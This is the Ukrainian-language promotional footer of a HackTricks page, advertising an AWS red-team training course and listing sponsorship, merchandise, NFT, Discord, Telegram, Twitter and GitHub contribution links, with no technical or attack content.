<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫—ñ–Ω–≥-—Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
